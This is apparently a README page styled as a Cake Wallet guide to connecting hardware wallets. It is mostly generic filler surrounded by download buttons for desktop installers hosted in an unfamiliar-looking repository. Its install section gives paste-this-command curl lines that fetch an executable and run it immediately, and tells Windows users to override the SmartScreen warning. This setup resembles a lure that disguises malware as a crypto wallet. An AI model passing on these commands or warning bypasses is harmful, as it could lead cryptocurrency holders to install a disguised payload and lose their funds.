![Cake Wallet hardware wallet guide](assets/cake-wallet-hardware-wallet-article-banner.png)

# Connect a Hardware Wallet to Cake Wallet

Which devices are evidenced, what each platform allows, and where it stops.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Connect the device, choose the hardware-wallet route when adding a wallet, and approve on the device itself. Ledger, Trezor, BitBox, COLDCARD and Cupcake are the evidenced options, with real per-platform limits: no hardware wallets on Linux, and Bluetooth Ledger on macOS. Cupcake pairs by QR and is phone-only.

<!-- ARTICLE-BODY-BEGIN -->

## Use a current build
Hardware support is the part of the app that depends most on the build and the platform, so start from the current release. Install it over your existing app, keep your wallet, and reconnect the device.

Download it from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a>. If the device was working before an update and stopped, reconnecting after the update is the first thing to try.

## Which devices work
Ledger, Trezor, BitBox, COLDCARD and Cupcake are evidenced across the documentation. Support is per coin and per connection type rather than blanket: a device that handles Bitcoin over USB may not handle Monero the same way.

That is why no page should promise universal support. Check the coin you actually hold, on the platform you actually use, before buying a device for this wallet.

## Per-platform limits
The limits are real and easy to miss. Ledger connects over Bluetooth on macOS, and hardware wallets are not supported on the Linux desktop build at all. Mobile supports Bluetooth devices, with the coin coverage above.

Planning around a limit is cheaper than discovering it after a purchase. If cables or Bluetooth are the problem, <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cupcake-pairing.md">Cupcake pairing with Cake Wallet</a> is the QR-based route, and it needs a spare phone rather than a device purchase.

## Coin-specific support
Coin coverage arrives coin by coin. Bitcoin Cash on Ledger, for example, came later than Bitcoin and needs a build that includes it, and older builds must not be assumed to work.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-bitcoin-cash-ledger.md">Bitcoin Cash on Ledger</a> states that boundary, so a BCH holder does not spend an evening on a device that cannot sign it yet.

## Air-gapped setups
A hardware wallet is not automatically air-gapped: one that connects by USB or Bluetooth has a live connection. Truly offline signing needs a device that never touches a network, which is what Cupcake provides from a spare phone.

The distinction matters when you are choosing a threat model rather than a product. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-air-gapped-wallet.md">What an air-gapped wallet is</a> separates the two, including what Cake Wallet itself is not.

## Restore as a fallback
A hardware wallet protects keys, and its recovery phrase is still the thing that saves you if the device is lost. That phrase belongs to the device's wallet, not to Cake Wallet, and the vendor's restore process applies.

If you are adding a device to an existing software wallet instead, the phrase you already have is what restores it anywhere. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Cake Wallet recovery phrase</a> covers what a backup actually contains before you rely on either route.

## FAQ
### Why won't Cake Wallet detect my hardware wallet?
Usually the connection type: Bluetooth pairing on desktop, a missing bridge, or the Linux build, which does not support hardware wallets.
### Does Cake Wallet support BitBox and COLDCARD?
Both are evidenced alongside Ledger and Trezor, with per-coin and per-platform limits.
### Can I restore Monero from a Ledger if it never asks for the view key?
The device must expose the view key for a Monero restore. If it does not prompt, the app cannot complete the restore and the device's own software is the place to check.
### What is a hardware wallet?
A device that holds keys offline and signs transactions on request, so the keys never sit on a networked computer.
### Which is the safest hardware wallet?
There is no measured ranking here. The safest is the one whose backup you have tested and whose firmware you keep updated.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cupcake pairing with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cupcake-pairing.md) · [Bitcoin Cash on Ledger](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-bitcoin-cash-ledger.md) · [Cake Wallet recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [what an air-gapped wallet is](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-air-gapped-wallet.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
